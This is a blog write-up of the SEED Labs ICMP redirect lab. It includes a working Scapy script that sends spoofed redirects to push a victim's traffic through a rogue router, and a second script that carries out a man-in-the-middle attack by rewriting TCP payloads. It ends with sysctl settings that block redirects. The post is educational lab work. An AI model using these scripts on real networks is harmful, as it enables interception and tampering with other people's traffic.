---
layout: post
title: ICMP Redirect Attack
categories: [icmp, scapy]
---

An ICMP redirect is an error message sent by a router to the sender of an IP packet. The purpose of this error message is to inform the sender of the IP packet that there is a better route it can use to reach its destination. While this is a neat feature, attackers can take advantage of this feature to redirect a machine's network traffic to a rouge router and sniff such traffic.

Redirects are used when a router believes a packet is being routed incorrectly, and it would like to inform the sender that it should use a different router for the subsequent packets sent to that same destination. ICMP redirect can be used by attackers to change a victim’s routing table.

```
malicious router 10.9.0.111
attacker 10.9.0.105
victim 10.9.0.5
host-A 192.168.60.5
host-B 192.168.60.6
router 10.9.0.11, 192.168.60.11
```

<details>
<summary><b>SeedLabs: ICMP Redirect Attack Lab</b></summary>
<div markdown="1">

- [ICMP Redirect Attack Lab](https://seedsecuritylabs.org/Labs_20.04/Files/ICMP_Redirect/ICMP_Redirect.pdf)

___
</div></details>


<br>

### Launching ICMP Redirect Attack
An ICMP redirect attack unlike the ARP cache poisoning directly attacks the routing table of the victim's machine. Though this attack does not change the routing table of the victim's machine, by informing the machine of a better route, the victim's machine creates a timed cache of the "supposed" better route.
This can be done through the code:

```python
#!/usr/bin/python3
import sys, os, time
from scapy.all import *

def main():
    # ensure correct usage
    if len(sys.argv) != 5:
        usage()
        sys.exit(2)
    
    # unpack
    router = sys.argv[1]
    victim = sys.argv[2]
    rouge_r = sys.argv[3]
    destination = sys.argv[4]
    
    # create packets
    ip = IP(src = router, dst = victim)
    icmp = ICMP(type = 5, code = 1, gw = rouge_r)
    ip2 = IP(src = victim, dst = destination)
    
    # send the packet
    try:
        while True:
            send(ip / icmp / ip2 / ICMP());
            time.sleep(1.5)
    except KeyboardInterrupt:
        sys.exit("Keyboard escaped")
        #os.system('clear')

def usage():
    print('Usage: ./icmp_redirect.py <router> <victim> <rouge-r> <destination>\
    \n\trouter: IP address of the actual router\
    \n\tvictim: IP address of the victim\
    \n\trouge-r: IP address of the rouge router\
    \n\tdestination: IP address of the host outside victim network\n')


if __name__ == '__main__':
    main()
```

It is important to note that if an entry exists in the routing cache, it trumps a similar entry in the actual routing table.

***Before running the ICMP redirect attack***

![1 1-route-before-redirect](https://github.com/iukadike/blog/assets/58455326/f2032eca-9667-4bb5-9984-e89a9d0389ff)

![1 1-mtr-before-redirect](https://github.com/iukadike/blog/assets/58455326/0f8c1826-c5eb-4cbc-ba0d-96852afca07a)

***After running the ICMP redirect attack***

![1 2-route-after-redirect](https://github.com/iukadike/blog/assets/58455326/abe25b52-8e7e-46eb-b927-c1d3b9db8164)

![1 2-mtr-after-redirect](https://github.com/iukadike/blog/assets/58455326/c6269890-f706-4cca-ba5d-6a5c4edc7bae)

The packet first goes to the rouge router. Once the malicious router receives the packet, it forwards it to the router; and thus is the return trip. This is because the malicious router has an entry for the router in its routing table as seen below

***rouge router table***

![1 2-rouge-router-table](https://github.com/iukadike/blog/assets/58455326/d6b7f2c3-997a-4d9b-992a-34455ea7b843)

![rouge-router-table](https://github.com/iukadike/blog/assets/58455326/9a190864-96e0-4ff5-8c87-a8332dbb194a)

When a ping request is sent from the victim to `host-A`, two ping requests and one ping reply make up the traffic. This can be seen in Wireshark when monitoring the victim's network
- first ICMP request is from the victim to the malicious router
- second ICMP request is from the malicious router to the router
- only ICMP reply is from router to the victim

***wireshark packet trace****

![1 4-wireshark-2](https://github.com/iukadike/blog/assets/58455326/d959b7e8-a6cc-42ee-a7bb-411263e5e3d5)

<br>

### ICMP redirect attacks to redirect to a remote machine
When the gateway you want the victim to redirect traffic to is outside of the victim's network, the victim would ignore the gateway address but rather use the router address. When it does this, it adds the router to its routing cache; however, this entry is not a timed entry. This means the entry doesn't expire and can only be updated by a better route or flushed. This can be seen in the screenshots below

***route to remote machine***

![1 3-route-remote](https://github.com/iukadike/blog/assets/58455326/7dab4549-0fe5-457c-9c04-3ba8bcf8ae41)

![1 3-mtr-remote](https://github.com/iukadike/blog/assets/58455326/42812d76-9c73-4e49-83bc-1a9942bef003)

<br>

### ICMP redirect attacks to redirect to a non-existing machine on the same network
When the gateway you want the victim to redirect traffic to is on the same network as the victim but either offline or non-existent, the victim would ignore the gateway address but rather use the router address. As with the remote host, When it does this, it adds the router to its routing cache; however, this entry is not a timed entry. This means the entry doesn't expire and can only be updated by a better route or flushed. This can be seen in the screenshots below

***route to non-existent machine***

![1 3-route-remote](https://github.com/iukadike/blog/assets/58455326/7dab4549-0fe5-457c-9c04-3ba8bcf8ae41)

![1 3-mtr-remote](https://github.com/iukadike/blog/assets/58455326/42812d76-9c73-4e49-83bc-1a9942bef003)

<br>

##### side note
```
net.ipv4.conf.all.send_redirects
net.ipv4.conf.default.send_redirects
net.ipv4.conf.eth0.send_redirects
```

When these are set to 1, the malicious router forwards a message to the victim to indicate the next hop. In essence, what this does is that it informs the victim that there is a better route to get to `host-A`. The victim takes note of this and updates its routing cache accordingly.

![1 4-next-hop](https://github.com/iukadike/blog/assets/58455326/bf4c5528-cc69-454b-8569-4588c680a84c)

However, when these are set to 0, the malicious router does not forward a message to the victim to indicate the next hop. This is the option we want.

![1 4-next-hop-2](https://github.com/iukadike/blog/assets/58455326/c9c768f9-ebd6-4121-98ef-3e2abb7e21a2)

<br>

### Launching the MITM Attack
You only need to capture traffic that comes to the rouge router. When the destination is sending traffic to the victim, it will do so via the real router. It is only when the traffic originates from the victim that it goes to the rouge router. This is true because the attacking machine uses the router to send the spoof traffic.

A simple MITM Attack can be launched using the below code

```python
#!/usr/bin/env python3
import re
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)

    if pkt[TCP].payload:
        # Decode payload
        data = pkt[TCP].payload.load.decode().lower()

        # Replace the pattern
        newdata = re.sub('ifeanyi', 'AAAAAAA', data, 1)
        
        # Send the packet wit the new data
        print(f'sending {newdata}')
        send(newpkt/newdata, verbose = 0)
    else: 
        send(newpkt, verbose = 0)

f = '(tcp port 9090) && (not ether src 02:42:22:32:2c:98)'
sniff(iface='br-5b598e26fa5c', filter=f, prn=spoof_pkt)
```

This can be better understood by the screenshots below

***MITM program***

![1 5-mitm-code](https://github.com/iukadike/blog/assets/58455326/84483232-cab3-4091-9b2f-39f483c88141)

***Server `host-A`***

![1 5-mitm-server](https://github.com/iukadike/blog/assets/58455326/3a0fe78b-40da-49bb-bc9b-651262f4e3e7)

***Victim***

![1 5-mitm-victim](https://github.com/iukadike/blog/assets/58455326/53863bb4-b58f-4408-b01b-2ad8a8489c76)

___
##### mitigation
By setting the following to 0, you can effectively prevent your machine from accepting `ICMP redirects`
```
net.ipv4.conf.all.accept_redirects
net.ipv4.conf.default.accept_redirects
net.ipv4.conf.eth0.accept_redirects
````

<br>

Thanks for reading...
